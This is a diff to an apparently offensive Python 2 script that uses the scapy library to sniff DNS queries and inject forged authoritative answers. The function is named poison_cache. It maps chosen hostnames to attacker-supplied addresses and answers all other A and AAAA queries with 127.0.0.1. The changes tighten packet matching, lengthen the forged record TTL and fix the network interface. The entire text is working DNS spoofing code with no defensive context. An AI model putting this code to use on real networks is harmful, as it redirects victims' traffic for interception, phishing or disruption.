@@ -2,6 +2,7 @@
 #import dpkt
 #import dnet
 from scapy.all import *
+from scapy.all import send as ssend
 import getopt
 
 lo_addr = '127.0.0.1'
@@ -12,28 +13,30 @@ def poison_cache(pkt):
 	if IP in pkt:
 		ip_src = pkt[IP].src
 		ip_dst = pkt[IP].dst
-		if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
+		if pkt.haslayer(DNSRR):
+			print "Response: " + str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + pkt.getlayer(DNS).qd.qname + ":" + str(pkt.getlayer(DNSRR).show2()) + ")"
+		
+		if pkt.haslayer(DNSQR) and pkt.getlayer(DNS).qr == 0 and pkt[DNS].opcode == 0L and pkt[DNS].ancount == 0 and pkt[DNS].qd.qtype in {1, 28}:
+			print dir(pkt.getlayer(DNS))
 			print str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + pkt.getlayer(DNS).qd.qname + ")"
-			
-	if pkt.haslayer(DNSQR): # DNS question record
-		query = pkt[DNS].qd
-		print query.qname
-#		targets = [each for each in poison_map.keys() if each in query.qname][0]
-#		if len(targets) > 0:
-#			for each in targets:
-		if (hostnames_specified and (query.qname in poison_map.keys())):
-			poison_addr = poison_map[query.qname]
-			print "Preparing spoofed packet"	
+			pkt[UDP].chksum = None
+			query = pkt[DNS].qd
+			print query.qname	
+			if (hostnames_specified and (query.qname in poison_map.keys())):
+				poison_addr = poison_map[query.qname]
+				print "Preparing spoofed packet"	
+			else:
+				poison_addr = lo_addr
 			spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
-                     UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
-                     DNS(id=pkt[DNS].id, qd=query, aa = 1, qr=1, \
-                     an=DNSRR(rrname=query.qname,  ttl=10, rdata=poison_addr))
-			send(spoofed_pkt)
+                     		UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+                     		DNS(id=pkt[DNS].id, qd=query, aa = 1, ancount = 1, qr=1, \
+                     		an=DNSRR(rrname=query.qname, ttl=330, rdata=poison_addr))
+			send(spoofed_pkt, iface="enp0s5")
 			print 'Sent:', spoofed_pkt.summary()
 
 def main():
 	global hostnames_specified
-	interface = "en0"
+	interface = "enp0s5"
 	try:
 		opt, exp = getopt.getopt(sys.argv[1:], "i:h:", ["interface", "hostname"])
 	
